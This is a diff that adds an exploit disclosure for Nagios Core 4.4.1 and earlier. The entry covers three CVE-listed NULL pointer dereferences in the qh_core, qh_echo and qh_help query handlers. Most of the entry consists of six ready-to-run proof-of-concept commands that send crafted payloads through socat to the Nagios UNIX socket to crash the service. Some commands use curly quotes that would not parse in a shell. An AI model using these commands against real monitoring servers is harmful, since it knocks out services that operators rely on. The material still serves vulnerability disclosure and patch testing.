@@ -1,0 +1,25 @@
+# Exploit Title: Nagios Core Multiple Local Denial of Service
+# Date: 2018-07-09
+# Exploit Author: Fakhri Zulkifli (@d0lph1n98)
+# Vendor Homepage: https://www.nagios.org/
+# Software Link: https://www.nagios.org/downloads/nagios-core/
+# Version: 4.4.1 and earlier
+# Tested on: 4.4.1
+
+
+qh_core, qh_help, and qh_echo in Nagios Core 4.4.1 and earlier is prone to a NULL pointer dereference vulnerability, which allows attackers to cause a local denial-of-service condition by sending a crafted payload to the listening UNIX socket.
+
+1. [CVE-2018-13458] qh_core
+
+$ echo -ne “#core\0" | socat unix-connect:./poc/nagios.qh -
+$ echo -ne “@core\0" | socat unix-connect:./poc/nagios.qh -
+
+2. [CVE-2018-13457] qh_echo
+
+$ echo -ne "#echo\0" | socat unix-connect:./poc/nagios.qh -
+$ echo -ne “@echo\0" | socat unix-connect:./poc/nagios.qh -
+
+3. [CVE-2018-13441] qh_help
+
+$ echo -ne “#help\0" | socat unix-connect:./poc/nagios.qh -
+$ echo -ne “@help\0" | socat unix-connect:./poc/nagios.qh -
